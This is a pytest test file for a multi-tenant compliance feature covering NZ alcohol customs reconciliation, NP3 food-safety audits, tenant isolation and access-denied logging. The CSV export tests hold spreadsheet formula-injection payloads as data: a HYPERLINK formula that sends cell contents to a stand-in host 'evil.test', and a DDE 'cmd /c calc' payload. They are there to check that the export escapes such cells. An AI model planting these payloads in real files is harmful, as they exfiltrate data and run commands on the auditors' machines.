"""HTTP contracts for the tenant-scoped Compliant product area."""

import csv
import io
from datetime import date
from decimal import Decimal
from types import SimpleNamespace
from unittest.mock import patch
from uuid import uuid4

import pytest

from app.core.db.models.inventory_item import InventoryItem
from app.core.db.models.inventory_movement import InventoryMovementType
from app.core.db.models.organisation import Organisation
from app.core.db.models.user import UserRole
from app.core.db.repositories.feature_subscription_repo import FeatureSubscriptionRepository
from app.core.db.repositories.user_repo import UserRepository
from app.core.security.auth_service import AuthService
from app.features.compliant.modules.nz_alcohol.live_evidence import derive_np3_core_evidence
from app.features.compliant.modules.nz_alcohol.module import run_check
from app.features.compliant.routes.api_routes import _add_months, _csv_safe
from app.features.compliant.service import ComplianceService, calculate_customs_reconciliation
from tests.dag_traversal_helpers import build_linear_dag, clear_org_synthetic_data
from tests.factories import DEFAULT_TEST_PASSWORD, OrganisationFactory


def _movement(movement_type: str, quantity: str, unit: str) -> SimpleNamespace:
    return SimpleNamespace(movement_type=movement_type, quantity=Decimal(quantity), unit=unit)


def _product(abv_percent: str) -> SimpleNamespace:
    return SimpleNamespace(abv_percent=Decimal(abv_percent))


def _admin_client(db, flask_app):
    org = OrganisationFactory()
    email = f"compliant-{uuid4()}@test.com"
    UserRepository(db).create_user(
        org_id=org.id,
        email=email,
        password_hash=AuthService.hash_password(DEFAULT_TEST_PASSWORD),
        role=UserRole.ADMIN,
        is_active=True,
    )
    # Every Compliant route is now gated on an active per-org subscription.
    FeatureSubscriptionRepository(db).grant(org.id, "compliant")
    db.commit()
    client = flask_app.test_client()
    client.environ_base["wsgi.url_scheme"] = "https"
    client.environ_base["HTTP_X_FORWARDED_PROTO"] = "https"
    response = client.post("/auth/login", json={"email": email, "password": DEFAULT_TEST_PASSWORD})
    assert response.status_code == 200
    return org, client


@pytest.fixture
def flask_app():
    from app.api.app_factory import create_app

    app = create_app()
    app.config.update(TESTING=True, WTF_CSRF_ENABLED=False)
    with app.app_context():
        yield app


def test_compliant_profile_records_and_audit_pack_are_org_scoped(db, flask_app):
    org_a, client_a = _admin_client(db, flask_app)
    org_b, client_b = _admin_client(db, flask_app)
    try:
        assert client_a.get("/api/compliant/overview").get_json()["frameworks"] == []
        profile = client_a.put(
            "/api/compliant/profile",
            json={
                "enabled": True,
                "settings": {"alcohol_product_types": ["spirits"], "trade_waste_council": "auckland-watercare"},
            },
        )
        assert profile.status_code == 200
        capture_context = client_a.get("/api/compliant/capture-context")
        assert capture_context.status_code == 200
        assert capture_context.get_json()["enabled"] is True
        assert (
            client_a.post(
                "/api/compliant/alcohol-products",
                json={"inventory_name": "House Gin", "product_type": "spirits", "abv_percent": "40"},
            ).status_code
            == 201
        )
        record = client_a.post(
            "/api/compliant/records",
            json={
                "framework_slug": "customs-alcohol",
                "control_id": "period-lodgement",
                "record_type": "lodgement",
                "title": "July excise entry",
                "period_start": "2026-07-01",
                "period_end": "2026-07-31",
                "evidence_reference": "NZCS filing 123",
            },
        )
        assert record.status_code == 201
        report = client_a.post("/api/compliant/reports/customs-alcohol", json={})
        assert report.status_code == 201
        report_id = report.get_json()["report"]["report_id"]
        assert client_a.get(f"/api/compliant/reports/{report_id}?format=csv").status_code == 200
        audit_html = client_a.get(f"/api/compliant/reports/{report_id}?format=html")
        assert audit_html.status_code == 200
        assert b"Source and scope" in audit_html.data
        assert client_b.get(f"/api/compliant/reports/{report_id}").status_code == 404
    finally:
        db.query(Organisation).filter(Organisation.id.in_([org_a.id, org_b.id])).delete(synchronize_session=False)
        db.commit()


def test_report_for_inapplicable_framework_returns_400(db, flask_app):
    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile",
                json={"enabled": True, "settings": {"alcohol_product_types": ["wine"]}},
            ).status_code
            == 200
        )
        # np3-food-control does not apply to wine-only producers, so it is filtered out
        # of evaluate() even though it is a real, known framework slug.
        response = client.post("/api/compliant/reports/np3-food-control", json={})
        assert response.status_code == 400
        assert "not applicable" in response.get_json()["error"]
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_report_for_inapplicable_framework_skips_the_reconciliation_scan(db, flask_app):
    """The 400 above must come from a cheap applicability check, not from evaluate()
    completing an expensive org-wide movement scan and then discarding the result."""
    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile",
                json={"enabled": True, "settings": {"alcohol_product_types": ["wine"]}},
            ).status_code
            == 200
        )
        with patch.object(
            ComplianceService,
            "customs_reconciliation",
            side_effect=AssertionError("customs_reconciliation() must not run for an inapplicable framework"),
        ):
            response = client.post("/api/compliant/reports/np3-food-control", json={})
        assert response.status_code == 400
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_compliant_routes_require_auth(flask_app):
    client = flask_app.test_client()
    client.environ_base["wsgi.url_scheme"] = "https"
    client.environ_base["HTTP_X_FORWARDED_PROTO"] = "https"
    assert client.get("/api/compliant/overview").status_code == 401
    assert client.get("/api/compliant/capture-context").status_code == 401
    assert client.post("/api/compliant/records", json={}).status_code == 401
    assert client.post("/api/compliant/np3-audit/attestations", json={}).status_code == 401


def test_np3_check_attestation_is_signed_and_scheduled(db, flask_app):
    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile", json={"enabled": True, "settings": {"food_control_programme": "np3"}}
            ).status_code
            == 200
        )
        response = client.post(
            "/api/compliant/np3-audit/attestations",
            json={
                "control_id": "registration-scope",
                "how_we_meet": "The operations manager checks the registration after any material site change.",
                "confirmed": True,
                "review_interval_months": 6,
            },
        )
        assert response.status_code == 201
        record = response.get_json()["record"]
        assert record["record_type"] == "attestation"
        assert record["details"]["attestation_confirmed"] is True
        assert record["details"]["review_interval_months"] == 6
        assert record["due_date"] == _add_months(date.today(), 6).isoformat()
        audit = client.get("/api/compliant/np3-audit").get_json()
        row = next(row for row in audit["rows"] if row["topic"] == "Registration / scope of operations")
        assert row["history"][0]["signed_off_by"]
        assert row["history"][0]["how_we_meet"].startswith("The operations manager")
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_np3_register_pdf_download_contains_audit_answers(db, flask_app):
    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile", json={"enabled": True, "settings": {"food_control_programme": "np3"}}
            ).status_code
            == 200
        )
        assert (
            client.post(
                "/api/compliant/np3-audit/attestations",
                json={
                    "control_id": "registration-scope",
                    "how_we_meet": "The scope register is reviewed before every verification.",
                    "confirmed": True,
                    "review_interval_months": 6,
                },
            ).status_code
            == 201
        )

        response = client.get("/api/compliant/np3-audit?format=pdf")

        assert response.status_code == 200
        assert response.mimetype == "application/pdf"
        assert response.data.startswith(b"%PDF-")
        assert "np3-verification-evidence.pdf" in response.headers["Content-Disposition"]
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_np3_review_reminder_handles_month_end():
    assert _add_months(date(2026, 8, 31), 6) == date(2027, 2, 28)


def test_np3_check_detail_and_review_setting_are_control_scoped(db, flask_app):
    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile", json={"enabled": True, "settings": {"food_control_programme": "np3"}}
            ).status_code
            == 200
        )
        detail = client.get("/api/compliant/np3-audit/checks/staff-competency")
        assert detail.status_code == 200
        check = detail.get_json()["check"]
        assert check["evidence_playbook"]["section"] == "Ensuring staff are trained and competent"
        assert check["guidance_url"].endswith("#page=25")
        setting = client.put(
            "/api/compliant/np3-audit/checks/staff-competency/settings", json={"review_interval_months": 12}
        )
        assert setting.status_code == 200
        assert setting.get_json()["review_interval_months"] == 12
        updated = client.get("/api/compliant/np3-audit/checks/staff-competency").get_json()["check"]
        assert updated["default_review_interval_months"] == 12
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_np3_staff_log_is_roster_driven_and_surfaces_as_a_system_action(db, flask_app):
    """A new active user is actionable without anyone creating a parallel checklist."""
    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile", json={"enabled": True, "settings": {"food_control_programme": "np3"}}
            ).status_code
            == 200
        )
        audit = client.get("/api/compliant/np3-audit").get_json()
        staff = audit["staff"]
        assert len(staff) == 1
        assert any(action["kind"] == "staff-training" for action in audit["work_queue"])
        finding = run_check(org.id, db)
        assert finding.flagged is True
        assert finding.data["system_finding"]["category"] == "NP3 compliance"
        assert finding.data["system_finding"]["action"] == {
            "href": "/compliant/nz-alcohol/food-safety",
            "label": "Open NP3",
        }
        overall_alert = finding.data["system_alerts"][0]
        assert overall_alert["title"] == "NP3 compliance needs attention"
        assert overall_alert["description"].endswith("NP3 checks require evidence or a response.")
        assert overall_alert["href"] == "/compliant/nz-alcohol/food-safety"
        assert finding.data["np3_work_queue"][0]["kind"] == "staff-training"

        system_findings = client.get("/api/core/system-findings")
        assert system_findings.status_code == 200
        np3_finding = next(
            item for item in system_findings.get_json()["findings"] if item["check_id"] == "compliant.nz_alcohol"
        )
        assert np3_finding["data"]["system_finding"]["category"] == "NP3 compliance"
        assert np3_finding["data"]["system_alerts"][0]["id"] == "np3-overall"
        assert any(alert["id"].startswith("np3-staff-competency-") for alert in np3_finding["data"]["system_alerts"])

        entry = client.post(
            "/api/compliant/np3-audit/checks/staff-competency/logs",
            json={
                "fields": {
                    "event_date": "2026-09-12",
                    "employee_user_id": staff[0]["id"],
                    "training_topic": "Allergen changeover and hygiene induction",
                    "competency_result": "observed-competent",
                    "review_notes": "Observed by the food safety lead.",
                }
            },
        )
        assert entry.status_code == 201
        assert entry.get_json()["record"]["record_type"] == "competency"
        check = client.get("/api/compliant/np3-audit/checks/staff-competency").get_json()["check"]
        assert check["log_entries"][0]["fields"]["training_topic"].startswith("Allergen")
        assert check["staff_actions"] == []
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_control_capture_requirements_are_enforced(db, flask_app):
    org, client = _admin_client(db, flask_app)
    try:
        assert client.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
        invalid = client.post(
            "/api/compliant/records",
            json={
                "framework_slug": "customs-alcohol",
                "control_id": "period-lodgement",
                "record_type": "lodgement",
                "title": "Missing the period and evidence",
            },
        )
        assert invalid.status_code == 400
        assert "period start" in invalid.get_json()["error"]
        invalid_link = client.post(
            "/api/compliant/records",
            json={
                "framework_slug": "customs-alcohol",
                "control_id": "movement-evidence",
                "record_type": "attestation",
                "title": "Unverified core link",
                "evidence_reference": "dispatch-note-7",
                "source_refs": [str(uuid4())],
            },
        )
        assert invalid_link.status_code == 400
        assert "this organisation" in invalid_link.get_json()["error"]
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


@pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
def test_csv_safe_prefixes_every_formula_trigger_character(trigger):
    assert _csv_safe(f"{trigger}cmd|calc").startswith("'" + trigger)


def test_csv_safe_leaves_ordinary_text_and_none_untouched():
    assert _csv_safe("July excise entry") == "July excise entry"
    assert _csv_safe(None) == ""


def test_audit_pack_csv_export_neutralises_formula_injection(db, flask_app):
    """A record title/evidence_reference starting with a formula-trigger character (=, +,
    -, @) must not reach the CSV export unescaped: opened in Excel/Sheets/LibreOffice by
    the auditor the pack is generated for, an unescaped cell can execute a formula (legacy
    DDE, HYPERLINK exfiltration). See .agents/reports/compliant-platform/security-audit.md
    finding F1."""
    org, client = _admin_client(db, flask_app)
    try:
        assert client.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
        record = client.post(
            "/api/compliant/records",
            json={
                "framework_slug": "customs-alcohol",
                "control_id": "product-mapping",
                "record_type": "attestation",
                "title": '=HYPERLINK("http://evil.test/?x="&A1,"x")',
                "evidence_reference": "+cmd|'/c calc'!A1",
            },
        )
        assert record.status_code == 201
        report = client.post("/api/compliant/reports/customs-alcohol", json={})
        assert report.status_code == 201
        report_id = report.get_json()["report"]["report_id"]
        csv_body = client.get(f"/api/compliant/reports/{report_id}?format=csv").data.decode()
        rows = list(csv.reader(io.StringIO(csv_body)))
        data_row = rows[1]
        assert data_row[4] == '\'=HYPERLINK("http://evil.test/?x="&A1,"x")'
        assert data_row[8] == "'+cmd|'/c calc'!A1"
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


# --- calculate_customs_reconciliation: pure function, the product's core "live evidence"
# calculation (Customs litres-of-alcohol reconciliation). Was 0% covered -- no test in the
# suite exercised unit conversion, unprofiled/unsupported-unit accounting, or the
# production/wastage split before this pass.


def test_customs_reconciliation_converts_ml_and_l_and_splits_production_wastage():
    profiles = {"House Gin": _product("40")}
    movements = [
        (_movement(InventoryMovementType.PRODUCTION.value, "5000", "ml"), "House Gin"),  # 5L @ 40% = 2 LAL
        (_movement(InventoryMovementType.PRODUCTION.value, "2", "L"), "House Gin"),  # 2L @ 40% = 0.8 LAL
        (_movement(InventoryMovementType.WASTAGE.value, "1000", "ml"), "House Gin"),  # 1L @ 40% = 0.4 LAL
    ]
    result = calculate_customs_reconciliation(profiles, movements)
    assert result["production_litres_of_alcohol"] == "2.8000"
    assert result["wastage_litres_of_alcohol"] == "0.4000"
    assert result["unprofiled_movement_count"] == 0
    assert result["unsupported_unit_movement_count"] == 0
    assert result["profiled_product_count"] == 1


@pytest.mark.parametrize("movement_type", [InventoryMovementType.ADD.value, InventoryMovementType.ADJUSTMENT.value])
def test_customs_reconciliation_ignores_non_production_wastage_movement_types(movement_type):
    profiles = {"House Gin": _product("40")}
    movements = [(_movement(movement_type, "1000", "ml"), "House Gin")]
    result = calculate_customs_reconciliation(profiles, movements)
    assert result["production_litres_of_alcohol"] == "0.0000"
    assert result["wastage_litres_of_alcohol"] == "0.0000"
    assert result["unprofiled_movement_count"] == 0
    assert result["unsupported_unit_movement_count"] == 0


def test_customs_reconciliation_counts_unprofiled_and_unsupported_unit_movements_by_name():
    profiles: dict = {}
    movements = [
        (_movement(InventoryMovementType.PRODUCTION.value, "1000", "ml"), "Unmapped Rum"),
        (_movement(InventoryMovementType.PRODUCTION.value, "1000", "ml"), "Unmapped Rum"),
        (_movement(InventoryMovementType.WASTAGE.value, "5", "kg"), "House Gin"),
    ]
    profiles["House Gin"] = _product("40")
    result = calculate_customs_reconciliation(profiles, movements)
    assert result["unprofiled_movement_count"] == 2
    assert result["unprofiled_inventory_names"] == ["Unmapped Rum"]
    assert result["unsupported_unit_movement_count"] == 1
    assert result["unsupported_inventory_units"] == ["House Gin (kg)"]
    # Neither an unprofiled nor an unsupported-unit movement contributes to the LAL totals.
    assert result["production_litres_of_alcohol"] == "0.0000"
    assert result["wastage_litres_of_alcohol"] == "0.0000"


# --- Control-state evaluation (ComplianceService._control_state via /api/compliant/overview):
# the "attention"/"setup"/"compliant" traffic-light logic that drives the dashboard. Several
# branches (overdue/breached reasons, the reconciliation control's live-data-gap and
# declared-vs-calculated-variance attention states, the CRM-mapping "setup" fallback, and the
# consent-profile "compliant" state) had no coverage before this pass.


def test_reconciliation_control_flags_attention_when_live_data_has_unprofiled_movements(db, flask_app):
    from uuid import uuid4 as _uuid4

    from app.core.db.models.inventory_item import InventoryItem
    from app.core.db.models.inventory_movement import InventoryMovement
    from app.core.domain.inventory_quantity_guard import (
        InventoryQuantityWriteReason,
        allow_inventory_quantity_write,
    )

    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile",
                json={"enabled": True, "settings": {"alcohol_product_types": ["spirits"]}},
            ).status_code
            == 200
        )
        assert (
            client.post(
                "/api/compliant/alcohol-products",
                json={"inventory_name": "House Gin", "product_type": "spirits", "abv_percent": "40"},
            ).status_code
            == 201
        )
        # A production movement against a DIFFERENT, unprofiled item -- the live reconciliation
        # scan should see it as an unprofiled movement and flag the reconciliation control.
        with allow_inventory_quantity_write(InventoryQuantityWriteReason.REPOSITORY_CREATE):
            item = InventoryItem(
                org_id=org.id, name="Unmapped Vodka", unit="ml", quantity=Decimal("0"), inventory_type="final_product"
            )
            db.add(item)
            db.flush()
            db.add(
                InventoryMovement(
                    id=_uuid4(),
                    org_id=org.id,
                    inventory_item_id=item.id,
                    movement_type=InventoryMovementType.PRODUCTION.value,
                    quantity=Decimal("1000"),
                    unit="ml",
                )
            )
            db.commit()

        overview = client.get("/api/compliant/overview").get_json()
        framework = next(f for f in overview["frameworks"] if f["slug"] == "customs-alcohol")
        reconciliation_control = next(c for c in framework["controls"] if c["control_id"] == "reconciliation")
        assert reconciliation_control["state"] == "attention"
        assert "unprofiled" in reconciliation_control["reason"].lower()
    finally:
        db.query(InventoryMovement).filter(InventoryMovement.org_id == org.id).delete(synchronize_session=False)
        db.query(InventoryItem).filter(InventoryItem.org_id == org.id).delete(synchronize_session=False)
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_reconciliation_control_flags_attention_when_declared_lal_exceeds_tolerance(db, flask_app):
    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile",
                json={"enabled": True, "settings": {"alcohol_product_types": ["spirits"]}},
            ).status_code
            == 200
        )
        assert (
            client.post(
                "/api/compliant/alcohol-products",
                json={"inventory_name": "House Gin", "product_type": "spirits", "abv_percent": "40"},
            ).status_code
            == 201
        )
        # No production/wastage movements exist, so calculated LAL is 0 -- a declared value
        # far outside the default 0.01 tolerance must flag "attention", not "compliant".
        record = client.post(
            "/api/compliant/records",
            json={
                "framework_slug": "customs-alcohol",
                "control_id": "reconciliation",
                "record_type": "reading",
                "title": "Declared LAL",
                "period_start": "2026-07-01",
                "period_end": "2026-07-31",
                "evidence_reference": "Customs filing 2026-07",
                "declared_litres_of_alcohol": "5.0",
            },
        )
        assert record.status_code == 201, record.get_json()

        overview = client.get("/api/compliant/overview").get_json()
        framework = next(f for f in overview["frameworks"] if f["slug"] == "customs-alcohol")
        reconciliation_control = next(c for c in framework["controls"] if c["control_id"] == "reconciliation")
        assert reconciliation_control["state"] == "attention"
        assert "differs from calculated" in reconciliation_control["reason"]
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_consent_profile_control_is_compliant_once_council_and_consent_reference_are_set(db, flask_app):
    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile",
                json={
                    "enabled": True,
                    "council_name": "Auckland Council",
                    "trade_waste_consent_reference": "TWC-12345",
                    "settings": {"alcohol_product_types": ["spirits"], "trade_waste_council": "auckland-watercare"},
                },
            ).status_code
            == 200
        )
        overview = client.get("/api/compliant/overview").get_json()
        trade_waste_framework = next(
            (f for f in overview["frameworks"] if any(c["control_id"] == "consent-profile" for c in f["controls"])),
            None,
        )
        assert trade_waste_framework is not None, "expected a framework with a consent-profile control to apply"
        consent_control = next(c for c in trade_waste_framework["controls"] if c["control_id"] == "consent-profile")
        assert consent_control["state"] == "compliant"
        assert consent_control["reason"] == "Council consent profile configured"
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


# --- Observability: a rejected cross-tenant lookup must be traceable, not just a bare
# 404/400. Same access_denied event name app/core/security/permissions.py and
# inventory_repo.py use, per the observability skill's rule.


def test_cross_org_report_lookup_emits_access_denied(db, flask_app, caplog):
    import logging

    org_a, client_a = _admin_client(db, flask_app)
    org_b, client_b = _admin_client(db, flask_app)
    try:
        assert client_a.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
        report = client_a.post("/api/compliant/reports/customs-alcohol", json={})
        assert report.status_code == 201
        report_id = report.get_json()["report"]["report_id"]

        with caplog.at_level(logging.WARNING):
            resp = client_b.get(f"/api/compliant/reports/{report_id}")
        assert resp.status_code == 404

        denials = [r for r in caplog.records if "access_denied" in r.getMessage()]
        assert denials, f"cross-org report lookup was not logged: {[r.getMessage() for r in caplog.records]}"
        assert "report_not_found_or_cross_org" in denials[0].getMessage()
    finally:
        db.query(Organisation).filter(Organisation.id.in_([org_a.id, org_b.id])).delete(synchronize_session=False)
        db.commit()


def test_own_org_report_lookup_does_not_log_access_denied(db, flask_app, caplog):
    import logging

    org, client = _admin_client(db, flask_app)
    try:
        assert client.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
        report = client.post("/api/compliant/reports/customs-alcohol", json={})
        assert report.status_code == 201
        report_id = report.get_json()["report"]["report_id"]

        with caplog.at_level(logging.WARNING):
            resp = client.get(f"/api/compliant/reports/{report_id}")
        assert resp.status_code == 200

        denials = [r for r in caplog.records if "access_denied" in r.getMessage()]
        assert denials == [], f"legitimate same-org lookup must not log access_denied: {denials}"
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_cross_org_source_ref_emits_access_denied(db, flask_app, caplog):
    import logging

    org, client = _admin_client(db, flask_app)
    try:
        assert client.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
        with caplog.at_level(logging.WARNING):
            response = client.post(
                "/api/compliant/records",
                json={
                    "framework_slug": "customs-alcohol",
                    "control_id": "movement-evidence",
                    "record_type": "attestation",
                    "title": "Probe",
                    "evidence_reference": "dispatch-note-1",
                    "source_refs": [str(uuid4())],
                },
            )
        assert response.status_code == 400

        denials = [r for r in caplog.records if "access_denied" in r.getMessage()]
        assert denials, f"invalid source_ref was not logged: {[r.getMessage() for r in caplog.records]}"
        assert "source_ref_not_in_org" in denials[0].getMessage()
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_run_check_is_not_flagged_when_module_not_enrolled(db, flask_app):
    """AC: module.py's CoreChecksRunner check -- an org with no ComplianceProfile at all
    (never enrolled) returns flagged=False with an empty frameworks list, not an error."""
    org, _client = _admin_client(db, flask_app)
    try:
        result = run_check(org.id, db)
        assert result.flagged is False
        assert result.data == {"frameworks": []}
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_run_check_is_not_flagged_when_no_control_needs_attention(db, flask_app):
    """AC: a freshly-enrolled profile with no records yet has every control in setup/
    compliant state, never attention -- run_check must not flag a brand-new org."""
    org, client = _admin_client(db, flask_app)
    try:
        assert client.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
        result = run_check(org.id, db)
        assert result.flagged is False
        assert result.message is None
        assert result.data["frameworks"], "an enabled profile should still evaluate applicable frameworks"
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_run_check_flags_and_counts_attention_frameworks(db, flask_app):
    """AC: run_check is flagged=True with a message that counts *how many* applicable
    frameworks are in the attention state -- two failed records in two different
    frameworks must produce a count of 2, not a hardcoded '1' that happens to match a
    single-framework case."""
    org, client = _admin_client(db, flask_app)
    try:
        assert client.put("/api/compliant/profile", json={"enabled": True, "settings": {}}).status_code == 200
        first = client.post(
            "/api/compliant/records",
            json={
                "framework_slug": "customs-alcohol",
                "control_id": "product-mapping",
                "record_type": "attestation",
                "status": "failed",
                "title": "Product mapping review failed",
            },
        )
        assert first.status_code == 201
        second = client.post(
            "/api/compliant/records",
            json={
                "framework_slug": "np3-food-control",
                "control_id": "registration-scope",
                "record_type": "attestation",
                "status": "failed",
                "title": "Registration scope review failed",
            },
        )
        assert second.status_code == 201

        result = run_check(org.id, db)

        assert result.flagged is True
        assert result.message == "2 NZ Alcohol compliance framework(s) need attention"
        attention_frameworks = [f for f in result.data["frameworks"] if f["state"] == "attention"]
        assert {f["slug"] for f in attention_frameworks} == {"customs-alcohol", "np3-food-control"}
    finally:
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_np3_live_evidence_projects_real_core_dag_lineage(db, flask_app):
    """NP3 proves a connected Core production slice, not just that executions were counted."""
    org, client = _admin_client(db, flask_app)
    try:
        assert (
            client.put(
                "/api/compliant/profile",
                json={"enabled": True, "settings": {"food_control_programme": "np3"}},
            ).status_code
            == 200
        )
        graph = build_linear_dag(db, org.id)
        raw_material = db.get(InventoryItem, graph["r1_id"])
        raw_material.supplier = "Traceable Malt Co"
        raw_material.supplier_batch_number = "MALT-2026-09"
        raw_material.purchase_date = date(2026, 9, 1)
        db.commit()

        observations, summary = derive_np3_core_evidence(db, org.id)
        trace = next(item for item in observations if item["control_id"] == "trace-and-recall")
        assert trace["workspace_url"] == "/core/sourcemap?show=check-needed"
        assert trace["workspace_label"] == "Open source map trace"
        assert str(graph["f1_id"]) in trace["source_refs"]
        assert str(graph["execution_id"]) in trace["source_refs"]
        assert summary["dag_lineage_edges"] == 2
        assert summary["dag_traced_final_products"] == 1
        assert any(item["control_id"] == "receiving-food" for item in observations)

        audit = client.get("/api/compliant/np3-audit")
        assert audit.status_code == 200
        row = next(row for row in audit.get_json()["rows"] if row["control_id"] == "trace-and-recall")
        assert row["derived_evidence_count"] == 1
        assert str(graph["f1_id"]) in row["derived_evidence"][0]["source_refs"]
    finally:
        clear_org_synthetic_data(db, org.id)
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()


def test_np3_required_capture_policy_blocks_direct_core_step_completion(db, flask_app):
    """The UI shelf is not the security boundary: direct completion must not bypass NP3 policy."""
    from app.core.db.models.execution import Execution
    from app.core.db.models.execution_step import ExecutionStep
    from app.core.db.models.process import Process
    from app.core.db.models.step import Step
    from app.core.db.repositories.execution_repo import ExecutionRepository
    from app.core.db.repositories.process_repo import ProcessRepository

    org, client = _admin_client(db, flask_app)
    process = None
    try:
        response = client.put(
            "/api/compliant/profile",
            json={
                "enabled": True,
                "settings": {"food_control_programme": "np3", "np3_execution_evidence_mode": "required"},
            },
        )
        assert response.status_code == 200
        process_repo = ProcessRepository(db)
        process = process_repo.create_process(org_id=org.id, name="NP3 capture test", description="", is_draft=False)
        process_repo.add_step(
            process_id=process.id,
            org_id=org.id,
            step_number=1,
            position=1000,
            name="Production",
            inputs=[],
            outputs=[],
            execution_prompts=[],
        )
        execution = ExecutionRepository(db).create_execution(org_id=org.id, process_id=process.id)
        db.commit()
        execution_step = execution.execution_steps[0]

        completion = client.post(
            f"/api/core/executions/{execution.id}/steps/{execution_step.id}/complete",
            json={"actual_inputs": [], "actual_outputs": [], "execution_data": {}},
        )
        assert completion.status_code == 409
        assert completion.get_json()["code"] == "compliance_requirement_not_met"
        db.refresh(execution_step)
        assert execution_step.status.value != "completed"
    finally:
        if process is not None:
            db.query(ExecutionStep).filter(
                ExecutionStep.execution_id.in_(db.query(Execution.id).filter(Execution.process_id == process.id))
            ).delete(synchronize_session=False)
            db.query(Execution).filter(Execution.process_id == process.id).delete(synchronize_session=False)
            db.query(Step).filter(Step.process_id == process.id).delete(synchronize_session=False)
            db.query(Process).filter(Process.id == process.id).delete(synchronize_session=False)
        db.query(Organisation).filter(Organisation.id == org.id).delete(synchronize_session=False)
        db.commit()
